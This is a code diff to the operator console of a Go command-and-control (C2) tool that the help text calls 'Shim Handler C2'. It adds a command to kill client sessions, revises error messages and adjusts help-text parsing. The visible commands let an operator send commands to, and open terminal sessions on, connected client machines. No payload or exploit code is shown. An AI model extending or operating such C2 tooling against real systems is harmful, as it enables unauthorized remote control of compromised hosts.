@@ -258,19 +258,22 @@ func readStdin() {
 				clientId, err := strconv.Atoi(args[1])
 				if err != nil {
 					errorln("Error: Please provide a valid client ID")
+					caret()
 					break
 				}
 				if globalMap.GetCurrentId() <= clientId || clientId < 0 {
 					if len(args) < 3 {
-						errorln("Error: no active client")
+						errorln("Error: not an active client")
 					} else {
 						errorln("Error: client does not exist")
 					}
 				} else {
 					client := globalMap.GetClient(clientId)
 					killFlag = true
+					fmt.Printf("Client %d disconnected\n", clientId)
 					clientDisconnect(client)
 					killFlag = false
+					// caret()
 					break
 				}
 			} else {
@@ -278,7 +281,11 @@ func readStdin() {
 			}
 			caret()
 		case "help":
-			displayHelp(cmd)
+			if len(cmd) > 5 {
+				displayHelp(cmd[5:])
+			} else {
+				displayHelp(cmd)
+			}
 			caret()
 		case "":
 			if rawCmd != "" {
@@ -355,12 +362,17 @@ func displayHelp(cmd string) {
 		fmt.Printf(
 			"Usage: set active [client id]\n",
 		)
+	case "kill":
+		fmt.Println(
+			"Usage: kill [client id]",
+		)
 	default:
 		fmt.Printf(
 			"-----Shim Handler C2: Made by Michael Burke-----\n" +
 				"Commands: \n" +
 				"set  [options]		Set attributes. run \"set help\" for more info.\n" +
 				"get  [options]		Get attributes. run \"get help\" for more info.\n" +
+				"kill [id]		Kill a session\n" +
 				"send [command]		Send a command to the active client\n" +
 				"enter			Enter a terminal session with the active client\n" +
 				"leave			Leave the active terminal session\n" +
